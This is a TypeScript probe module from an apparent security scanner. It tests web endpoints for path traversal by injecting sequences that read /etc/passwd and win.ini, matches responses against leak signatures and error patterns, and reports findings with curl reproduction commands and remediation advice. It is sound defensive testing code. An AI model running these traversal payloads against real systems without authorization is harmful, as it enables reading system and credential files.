import type { RedTeamFinding } from '../types.js';
import type { ProbeContext, SecurityProbeModule } from './types.js';

const TRAVERSAL_INDICATORS = [
  'root:x:0:0:',
  '[boot loader]',
  '[extensions]',
  '; for 16-bit app support',
];

const TRAVERSAL_ERROR_PATTERNS = [
  { pattern: /(?:open_basedir restriction in effect|failed to open stream: Operation not permitted)/i, engine: 'PHP open_basedir' },
  { pattern: /(?:java\.io\.FileNotFoundException|java\.lang\.IllegalArgumentException)/i, engine: 'Java IO' },
  { pattern: /(?:System\.IO\.DirectoryNotFoundException|System\.IO\.PathTooLongException)/i, engine: '.NET IO' },
];

export const pathTraversalProbe: SecurityProbeModule = {
  id: 'path-traversal',
  name: 'Directory Traversal & Path Normalization Probing',
  category: 'path-traversal',
  defaultSeverity: 'high',
  cwe: 'CWE-22',
  cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
  profiles: ['comprehensive', 'orchestrated', 'playbook'],

  match: (context: ProbeContext) => {
    return context.endpoints.some((ep) =>
      ep.url.includes('?') ||
      ep.path.includes('/file') ||
      ep.path.includes('/doc') ||
      ep.path.includes('/download') ||
      ep.path.includes('/view') ||
      (ep.parameters && ep.parameters.some((p) => /file|path|doc|page|view|include|read|load/i.test(p.name)))
    );
  },

  run: async (context: ProbeContext): Promise<RedTeamFinding[]> => {
    const findings: RedTeamFinding[] = [];
    const { client, endpoints, options } = context;

    const candidates = endpoints.filter((ep) =>
      ep.url.includes('?') ||
      ep.path.includes('/file') ||
      ep.path.includes('/doc') ||
      ep.path.includes('/download') ||
      ep.path.includes('/view') ||
      (ep.parameters && ep.parameters.some((p) => /file|path|doc|page|view|include|read|load/i.test(p.name)))
    );

    const testSequences = [
      '../../../../etc/passwd',
      '..%2f..%2f..%2f..%2fetc%2fpasswd',
      '..\\..\\..\\..\\windows\\win.ini',
    ];

    for (const ep of candidates.slice(0, 5)) {
      const parsed = new URL(ep.url);
      const paramNames = Array.from(parsed.searchParams.keys());
      if (paramNames.length === 0 && ep.parameters) {
        for (const p of ep.parameters) paramNames.push(p.name);
      }
      if (paramNames.length === 0) paramNames.push('file');

      for (const param of paramNames) {
        for (const seq of testSequences) {
          try {
            const probeUrl = new URL(ep.url);
            probeUrl.searchParams.set(param, seq);

            const res = await client.fetchText(probeUrl.toString(), {
              headers: options.authToken ? { Authorization: options.authToken } : {},
              timeoutMs: 2500,
            });

            // 1. Direct file content reflection
            const hasLeak = TRAVERSAL_INDICATORS.some((ind) => res.text.includes(ind));
            if (hasLeak) {
              findings.push({
                id: `PATH-TRAVERSAL-LEAK-${ep.path.replace(/[^a-zA-Z0-9]/g, '_')}-${param}`,
                title: `Arbitrary File Read via Path Traversal on parameter '${param}'`,
                category: 'path-traversal',
                severity: 'critical',
                description: `Parameter '${param}' accepted traversal sequence '${seq}' and leaked system file contents.`,
                target: probeUrl.toString(),
                evidence: {
                  request: { method: 'GET', url: probeUrl.toString() },
                  response: { status: res.status, snippet: res.text.slice(0, 300) },
                  reproCurl: `curl -i -s "${probeUrl.toString()}"`,
                },
                remediation: 'Sanitize file paths with path.basename() or verify resolved path stays strictly within allowed base directory using path.resolve().',
                cwe: 'CWE-22',
                evidenceLevel: 'reproduced',
                confidence: 0.99,
              });
              break;
            }

            // 2. Traversal boundary error reflection
            for (const { pattern, engine } of TRAVERSAL_ERROR_PATTERNS) {
              if (pattern.test(res.text)) {
                findings.push({
                  id: `PATH-TRAVERSAL-ERROR-${ep.path.replace(/[^a-zA-Z0-9]/g, '_')}-${param}`,
                  title: `Path Traversal Error Reflection (${engine}) on parameter '${param}'`,
                  category: 'path-traversal',
                  severity: 'high',
                  description: `Parameter '${param}' reflected filesystem error (${engine}) upon injecting traversal sequence '${seq}'.`,
                  target: probeUrl.toString(),
                  evidence: {
                    request: { method: 'GET', url: probeUrl.toString() },
                    response: { status: res.status, snippet: res.text.slice(0, 300) },
                    reproCurl: `curl -i -s "${probeUrl.toString()}"`,
                  },
                  remediation: 'Validate input against an allowlist of valid file IDs instead of direct filesystem path parameters.',
                  cwe: 'CWE-22',
                  evidenceLevel: 'reproduced',
                  confidence: 0.95,
                });
                break;
              }
            }
          } catch {
            // Continue
          }
        }
      }
    }

    return findings;
  },
};
